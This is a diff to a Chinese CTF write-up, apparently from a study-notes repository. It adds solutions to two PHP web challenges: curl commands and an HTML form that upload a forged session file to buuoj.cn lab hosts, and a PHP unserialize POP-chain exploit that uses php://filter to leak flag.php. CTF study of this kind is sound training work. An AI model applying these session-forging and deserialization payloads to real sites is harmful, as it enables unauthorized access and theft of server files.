@@ -855,12 +855,30 @@ $_SESSION['username'] = 'admin';
 
 ```bash
 sha256sum sess_xxx
+# 432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
 ```
 
 - 上传文件
 
 ```bash
-curl -X POST -F "up_file=@/tmp/sess_xxx;filename=sess" http://6b7e9cce-8591-494f-84ed-7e9ab951499f.node5.buuoj.cn:81/
+curl -X POST -F "up_file=@/tmp/sess_2;filename=sess;" -F "direction=upload" http://f39c4ab1-8cf6-47a3-bc18-cbf23dce4c98.node5.buuoj.cn:81/
+
+curl -X POST -F "up_file=@/tmp/sess_2;filename=sess;" -F "attr=success.txt" -F "direction=upload" http://f39c4ab1-8cf6-47a3-bc18-cbf23dce4c98.node5.buuoj.cn:81/
+```
+
+此外也可以通过构建上传表单进行文件上传
+
+```html
+<form enctype="multipart/form-data" action="http://a917c0b3-2b1c-40ff-bd57-e804d096a865.node5.buuoj.cn:81/" method="POST">
+    <!-- MAX_FILE_SIZE must precede the file input field -->
+    <input type="hidden" name="MAX_FILE_SIZE" value="30000" />
+    <input type="hidden" name="direction" value="upload" />
+    <!-- <input type="hidden" name="attr" value="success.txt" /> -->
+    
+    <!-- Name of input element determines name in $_FILES array -->
+    Send this file: <input name="up_file" type="file" />
+    <input type="submit" value="Send File" />
+</form>
 ```
 
 例题：Jarvis OJ — PHPINFO 分析
@@ -1135,4 +1153,35 @@ class Make_a_Change
 }
 /**********************Try to See flag.php*****************************/
 
+```
+
+EXP:
+
+```php
+<?php
+class Road_is_Long
+{
+    public $page;
+    public $string;
+
+}
+
+class Try_Work_Hard
+{
+    protected  $var = 'php://filter/convert.base64-encode/resource=flag.php';
+}
+
+class Make_a_Change
+{
+    public $effort;
+}
+
+$o = new Road_is_Long;
+$o->page = new Road_is_Long;
+$o->page->string = new Make_a_Change;
+$o->page->string->effort = new Try_Work_Hard;
+
+$payload = serialize($o);
+echo 'payload:<br>' . $payload . '<br>';
+echo urlencode($payload); 
 ```
